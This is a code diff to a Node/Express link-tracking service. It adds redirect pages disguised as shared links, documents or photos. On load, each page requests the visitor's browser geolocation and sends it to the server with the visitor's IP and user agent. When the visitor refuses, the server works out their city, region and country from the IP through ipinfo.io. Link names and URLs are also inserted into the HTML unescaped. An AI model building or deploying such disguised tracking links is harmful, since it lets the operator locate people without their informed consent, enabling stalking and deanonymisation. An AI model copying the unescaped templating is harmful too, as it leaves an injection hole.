@@ -37,6 +37,10 @@ const visitSchema = new mongoose.Schema({
     longitude: { type: Number },
     ip_address: { type: String },
     user_agent: { type: String },
+    city: { type: String },
+    region: { type: String },
+    country: { type: String },
+    location_source: { type: String, enum: ['browser', 'ip', 'unknown'], default: 'unknown' },
     visited_at: { type: Date, default: Date.now }
 });
 
@@ -81,6 +85,35 @@ function renderTemplate(templatePath, data) {
     });
 
     return template;
+}
+
+// Fungsi untuk mendapatkan lokasi berdasarkan IP address
+async function getLocationFromIP(ip) {
+    try {
+        // Gunakan IP publik untuk testing jika IP adalah localhost atau IP pribadi
+        if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+            ip = '8.8.8.8'; // Gunakan IP Google sebagai fallback untuk testing
+        }
+
+        const response = await fetch(`https://ipinfo.io/${ip}/json`);
+        const data = await response.json();
+
+        if (data && data.loc) {
+            const [latitude, longitude] = data.loc.split(',');
+            return {
+                latitude: parseFloat(latitude),
+                longitude: parseFloat(longitude),
+                city: data.city,
+                region: data.region,
+                country: data.country,
+                source: 'ip'
+            };
+        }
+        return null;
+    } catch (error) {
+        console.error('Error getting location from IP:', error);
+        return null;
+    }
 }
 
 // API Routes
@@ -197,16 +230,41 @@ app.get('/api/links/:id', async (req, res) => {
 app.post('/api/track/:id', async (req, res) => {
     try {
         const { id } = req.params;
-        const { latitude, longitude } = req.body;
+        let { latitude, longitude, locationDenied } = req.body;
         const ip_address = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
         const user_agent = req.headers['user-agent'];
+
+        let locationSource = 'browser';
+        let city = null;
+        let region = null;
+        let country = null;
+
+        // Jika koordinat tidak tersedia atau lokasi ditolak, coba dapatkan dari IP
+        if ((!latitude || !longitude || locationDenied) && ip_address) {
+            console.log('Attempting to get location from IP:', ip_address);
+            const ipLocation = await getLocationFromIP(ip_address);
+
+            if (ipLocation) {
+                latitude = ipLocation.latitude;
+                longitude = ipLocation.longitude;
+                city = ipLocation.city;
+                region = ipLocation.region;
+                country = ipLocation.country;
+                locationSource = 'ip';
+                console.log('Location from IP:', { latitude, longitude, city, country });
+            }
+        }
 
         const visit = new Visit({
             link_id: id,
             latitude,
             longitude,
             ip_address,
-            user_agent
+            user_agent,
+            city,
+            region,
+            country,
+            location_source: locationSource
         });
 
         await visit.save();
@@ -228,23 +286,92 @@ app.get('/t/:id', async (req, res) => {
         }
 
         if (link.custom_url) {
-            // Fetch metadata dari URL tujuan
-            const metadata = await fetchUrlMetadata(link.custom_url);
-
-            // Render template dengan metadata
-            const htmlContent = renderTemplate(
-                path.join(__dirname, 'public', 'track.html'),
-                {
-                    og_title: metadata.title,
-                    og_description: metadata.description,
-                    og_image: metadata.image,
-                    og_url: metadata.url,
-                    redirect_url: link.custom_url
-                }
-            );
-
-            // Kirim HTML yang sudah dirender
-            res.send(htmlContent);
+            // Send HTML yang melakukan pelacakan dan redirect otomatis
+            const html = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Redirecting...</title>
+                ${link.custom_url ? `
+                <meta property="og:title" content="${link.name || 'Shared Link'}">
+                <meta property="og:description" content="Click to continue">
+                <meta property="og:url" content="${link.custom_url}">
+                <meta name="twitter:card" content="summary_large_image">
+                ` : ''}
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        height: 100vh;
+                        margin: 0;
+                        background-color: #f8f9fa;
+                    }
+                    .container {
+                        text-align: center;
+                        padding: 20px;
+                    }
+                    .redirect-msg {
+                        margin-bottom: 20px;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <div class="redirect-msg">Redirecting you to your destination...</div>
+                </div>
+                <script>
+                    // Function to send location data to the server
+                    function sendLocationData(position) {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                        
+                        fetch('/api/track/${id}', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(locationData)
+                        })
+                        .catch(error => console.error('Error sending location data:', error));
+                    }
+                    
+                    // Function to handle location error
+                    function handleLocationError(error) {
+                        console.error('Error getting location:', error);
+                        
+                        // Kirim data dengan indikasi lokasi ditolak
+                        fetch('/api/track/${id}', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ locationDenied: true })
+                        })
+                        .catch(error => console.error('Error sending location denial data:', error));
+                    }
+                    
+                    // Request location and redirect immediately
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError);
+                    } else {
+                        // Browser tidak mendukung geolocation
+                        fetch('/api/track/${id}', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ locationDenied: true })
+                        })
+                        .catch(error => console.error('Error sending fallback data:', error));
+                    }
+                    
+                    // Redirect immediately without waiting for location
+                    window.location.href = "${link.custom_url}";
+                </script>
+            </body>
+            </html>
+            `;
+            res.send(html);
         } else {
             res.sendFile(path.join(__dirname, 'public', 'tracker.html'));
         }
@@ -275,23 +402,92 @@ app.get('/file/:filename', async (req, res) => {
         }
 
         if (matchedLink.custom_url) {
-            // Fetch metadata dari URL tujuan
-            const metadata = await fetchUrlMetadata(matchedLink.custom_url);
-
-            // Render template dengan metadata
-            const htmlContent = renderTemplate(
-                path.join(__dirname, 'public', 'track.html'),
-                {
-                    og_title: metadata.title,
-                    og_description: metadata.description,
-                    og_image: metadata.image,
-                    og_url: metadata.url,
-                    redirect_url: matchedLink.custom_url
-                }
-            );
-
-            // Kirim HTML yang sudah dirender
-            res.send(htmlContent);
+            // Send HTML yang melakukan pelacakan dan redirect otomatis
+            const html = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Redirecting...</title>
+                ${matchedLink.custom_url ? `
+                <meta property="og:title" content="${matchedLink.name || 'Shared Document'}">
+                <meta property="og:description" content="Click to open the document">
+                <meta property="og:url" content="${matchedLink.custom_url}">
+                <meta name="twitter:card" content="summary_large_image">
+                ` : ''}
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        height: 100vh;
+                        margin: 0;
+                        background-color: #f8f9fa;
+                    }
+                    .container {
+                        text-align: center;
+                        padding: 20px;
+                    }
+                    .redirect-msg {
+                        margin-bottom: 20px;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <div class="redirect-msg">Opening document...</div>
+                </div>
+                <script>
+                    // Function to send location data to the server
+                    function sendLocationData(position) {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                        
+                        fetch('/api/track/${matchedLink.id}', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(locationData)
+                        })
+                        .catch(error => console.error('Error sending location data:', error));
+                    }
+                    
+                    // Function to handle location error
+                    function handleLocationError(error) {
+                        console.error('Error getting location:', error);
+                        
+                        // Kirim data dengan indikasi lokasi ditolak
+                        fetch('/api/track/${matchedLink.id}', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ locationDenied: true })
+                        })
+                        .catch(error => console.error('Error sending location denial data:', error));
+                    }
+                    
+                    // Request location and redirect immediately
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError);
+                    } else {
+                        // Browser tidak mendukung geolocation
+                        fetch('/api/track/${matchedLink.id}', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ locationDenied: true })
+                        })
+                        .catch(error => console.error('Error sending fallback data:', error));
+                    }
+                    
+                    // Redirect immediately without waiting for location
+                    window.location.href = "${matchedLink.custom_url}";
+                </script>
+            </body>
+            </html>
+            `;
+            res.send(html);
         } else {
             res.redirect(`/track.html?id=${matchedLink.id}&type=file`);
         }
@@ -320,23 +516,92 @@ app.get('/photo/:filename', async (req, res) => {
         }
 
         if (link.custom_url) {
-            // Fetch metadata dari URL tujuan
-            const metadata = await fetchUrlMetadata(link.custom_url);
-
-            // Render template dengan metadata
-            const htmlContent = renderTemplate(
-                path.join(__dirname, 'public', 'track.html'),
-                {
-                    og_title: metadata.title,
-                    og_description: metadata.description,
-                    og_image: metadata.image,
-                    og_url: metadata.url,
-                    redirect_url: link.custom_url
-                }
-            );
-
-            // Kirim HTML yang sudah dirender
-            res.send(htmlContent);
+            // Send HTML yang melakukan pelacakan dan redirect otomatis
+            const html = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Redirecting...</title>
+                ${link.custom_url ? `
+                <meta property="og:title" content="${link.name || 'Shared Photo'}">
+                <meta property="og:description" content="Click to view the photo">
+                <meta property="og:url" content="${link.custom_url}">
+                <meta name="twitter:card" content="summary_large_image">
+                ` : ''}
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        height: 100vh;
+                        margin: 0;
+                        background-color: #f8f9fa;
+                    }
+                    .container {
+                        text-align: center;
+                        padding: 20px;
+                    }
+                    .redirect-msg {
+                        margin-bottom: 20px;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <div class="redirect-msg">Opening photo...</div>
+                </div>
+                <script>
+                    // Function to send location data to the server
+                    function sendLocationData(position) {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                        
+                        fetch('/api/track/${id}', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(locationData)
+                        })
+                        .catch(error => console.error('Error sending location data:', error));
+                    }
+                    
+                    // Function to handle location error
+                    function handleLocationError(error) {
+                        console.error('Error getting location:', error);
+                        
+                        // Kirim data dengan indikasi lokasi ditolak
+                        fetch('/api/track/${id}', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ locationDenied: true })
+                        })
+                        .catch(error => console.error('Error sending location denial data:', error));
+                    }
+                    
+                    // Request location and redirect immediately
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError);
+                    } else {
+                        // Browser tidak mendukung geolocation
+                        fetch('/api/track/${id}', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ locationDenied: true })
+                        })
+                        .catch(error => console.error('Error sending fallback data:', error));
+                    }
+                    
+                    // Redirect immediately without waiting for location
+                    window.location.href = "${link.custom_url}";
+                </script>
+            </body>
+            </html>
+            `;
+            res.send(html);
         } else {
             res.redirect(`/track.html?id=${id}&type=photo`);
         }
